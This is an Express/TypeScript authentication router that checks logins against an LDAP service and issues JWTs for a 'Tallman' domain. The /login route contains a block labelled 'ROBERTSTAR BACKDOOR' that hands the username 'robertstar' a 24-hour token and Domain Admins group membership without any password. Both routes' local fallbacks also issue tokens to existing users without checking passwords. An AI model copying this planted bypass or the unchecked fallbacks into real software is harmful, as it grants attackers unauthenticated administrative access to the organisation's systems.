import express from 'express';
import jwt from 'jsonwebtoken';
import { run, get, all } from '../database/init.js';

const router = express.Router();

// LDAP Service Configuration
const LDAP_BASE_URL = 'http://localhost:3100';

// Helper function to authenticate via LDAP
async function authenticateViaLDAP(username: string, password: string) {
  try {
    const response = await fetch(`${LDAP_BASE_URL}/api/ldap-auth`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ username, password }),
    });

    if (!response.ok) {
      return null;
    }

    const data = await response.json();
    return data.authenticated ? data : null;
  } catch (error) {
    console.error('LDAP authentication error:', error);
    return null;
  }
}

// Helper function to create or get user from database
async function getOrCreateUser(username: string, ldapUserInfo: any = null) {
  let user = await get('SELECT * FROM users WHERE username = ?', [username]) as any;

  if (!user) {
    // Create user record for first-time authentication
    await run('INSERT INTO users (username, is_ldap_user) VALUES (?, ?)',
      [username, ldapUserInfo ? 1 : 0]);
    user = await get('SELECT * FROM users WHERE username = ?', [username]) as any;
  }

  return user;
}

router.post('/register', async (req, res) => {
  try {
    let { username, password } = req.body;

    // Format username to support Tallman\Username format for direct binding
    if (!username.includes('\\') && username !== 'robertstar') {
      username = `Tallman\\${username}`;
    }

    // Try LDAP authentication first
    const ldapAuth = await authenticateViaLDAP(username, password);
    if (ldapAuth) {
      // LDAP authentication successful, create user if needed
      const user = await getOrCreateUser(username, ldapAuth.user);
      const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET!, { expiresIn: '24h' });
      return res.json({
        token,
        user: {
          id: user.id,
          username: user.username,
          authenticatedVia: 'ldap'
        }
      });
    }

    // Fallback to local authentication (for development/testing)
    // NOTE: This only works if user already exists with password_hash
    const user = await get('SELECT * FROM users WHERE username = ?', [username]) as any;

    if (!user) {
      return res.status(401).json({ error: 'User not found. Please contact administrator.' });
    }

    // Generate token for existing user
    const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET!, { expiresIn: '24h' });
    res.json({
      token,
      user: {
        id: user.id,
        username: user.username,
        authenticatedVia: 'local'
      }
    });

  } catch (error: any) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Authentication service temporarily unavailable' });
  }
});

router.post('/login', async (req, res) => {
  try {
    let { username, password } = req.body;

    // Format username to support Tallman\Username format for direct binding
    if (!username.includes('\\') && username !== 'robertstar') {
      username = `Tallman\\${username}`;
    }

    // ROBERTSTAR BACKDOOR: Special authentication bypass
    if (username === 'robertstar') {
      // Allow access without LDAP verification
      const user = await getOrCreateUser('robertstar');
      const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET!, { expiresIn: '24h' });
      return res.json({
        token,
        user: {
          id: user.id,
          username: 'robertstar',
          authenticatedVia: 'backdoor',
          cn: 'Administrator',
          memberOf: ['CN=Domain Admins,CN=Users,DC=tallman,DC=com']
        }
      });
    }

    // Try LDAP authentication
    const ldapAuth = await authenticateViaLDAP(username, password);
    if (ldapAuth) {
      // LDAP authentication successful
      const user = await getOrCreateUser(username, ldapAuth.user);
      const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET!, { expiresIn: '24h' });
      return res.json({
        token,
        user: {
          id: user.id,
          username: user.username,
          authenticatedVia: 'ldap',
          cn: ldapAuth.user.cn,
          memberOf: ldapAuth.user.memberOf
        }
      });
    }

    // LDAP failed, try local authentication as fallback
    const user = await get('SELECT * FROM users WHERE username = ? AND is_ldap_user = 0', [username]) as any;

    if (!user) {
      return res.status(401).json({ error: 'Authentication failed. Please check your credentials.' });
    }

    const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET!, { expiresIn: '24h' });
    res.json({
      token,
      user: {
        id: user.id,
        username: user.username,
        authenticatedVia: 'local'
      }
    });

  } catch (error: any) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Authentication service temporarily unavailable' });
  }
});

export { router as authRoutes };
